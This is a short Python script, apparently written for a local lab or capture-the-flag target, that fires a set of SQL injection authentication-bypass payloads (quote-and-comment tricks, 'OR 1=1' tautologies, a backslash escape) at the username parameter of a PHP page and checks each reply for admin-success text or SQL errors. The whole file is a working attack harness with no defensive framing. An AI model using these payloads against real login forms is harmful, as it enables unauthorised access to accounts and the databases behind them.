import requests, urllib.parse

test_url = "http://127.0.0.1:33148/index.php"

payloads = {
    "admin%23": "admin%23",
    "admin'--": "admin%27--+",
    "admin' OR '1'='1": "admin%27+OR+%271%27%3D%271",
    "admin' AND 1=1--": "admin%27+AND+1%3D1--+",
    "admin\\' OR 1=1--": "admin%5C%27+OR+1%3D1--+",
    "' OR 1=1--": "%27+OR+1%3D1--+",
}

print("AUTH BYPASS TEST")
print("================")
print(f"Target: {test_url}\n")

for name, payload in payloads.items():
    try:
        resp = requests.get(test_url, params={"username": urllib.parse.unquote(payload)}, timeout=10)
        body = resp.text.lower()
        has_not_admin = "you are not the admin" in body
        has_success = "you are the admin" in body or "welcome admin" in body
        has_error = "sql" in body or "syntax" in body or "mysql" in body
        
        print(f"Payload: {name}")
        print(f"Status: {resp.status_code}")
        print(f"Length: {len(resp.text)}")
        print(f"Not Admin Msg: {has_not_admin}")
        print(f"Success Msg: {has_success}")
        print(f"SQL Error: {has_error}")
        print()
        
    except Exception as e:
        print(f"Payload: {name}")
        print(f"ERROR: {e}")
        print()

print("Test complete")
